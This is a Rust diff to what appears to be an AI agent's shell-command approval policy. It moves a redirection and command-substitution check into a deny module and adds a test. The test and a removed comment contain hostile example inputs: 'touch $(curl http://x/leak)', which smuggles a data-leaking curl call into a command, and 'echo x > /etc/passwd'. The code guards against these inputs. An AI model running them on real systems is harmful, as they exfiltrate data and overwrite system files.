@@ -254,7 +254,7 @@ pub fn evaluate_shell_command(policy: &ExecPolicy, command: &str) -> ToolExecuti
     //    command has no redirection or command substitution — those can write
     //    files or run sub-commands a trusted prefix doesn't cover.
     if !segments.is_empty()
-        && !has_redirection_or_substitution(command)
+        && !shell_deny::has_redirection_or_substitution(command)
         && segments.iter().all(|segment| {
             policy
                 .trusted_shell_prefixes
@@ -283,16 +283,6 @@ pub fn evaluate_shell_command(policy: &ExecPolicy, command: &str) -> ToolExecuti
         risk_level: RiskLevel::High,
         matched_rule: Some("builtin:shell_default".to_string()),
     }
-}
-
-/// True if the command contains shell redirection or command substitution,
-/// which disqualifies it from auto-trust (a trusted `echo` must not become an
-/// auto-approved file write via `echo x > /etc/passwd`).
-fn has_redirection_or_substitution(command: &str) -> bool {
-    command.contains('>')
-        || command.contains('<')
-        || command.contains('`')
-        || command.contains("$(")
 }
 
 /// Whether a gated call is auto-approvable under `AcceptEdits` mode: a workspace
@@ -350,6 +340,11 @@ mod tests {
         assert!(!accept_edits_approvable(
             "shell",
             &json!({"command": "curl https://x"})
+        ));
+        // Command substitution is never a bounded workspace edit.
+        assert!(!accept_edits_approvable(
+            "shell",
+            &json!({"command": "touch $(curl http://x/leak)"})
         ));
         // fs command escaping the workspace does NOT qualify.
         assert!(!accept_edits_approvable(
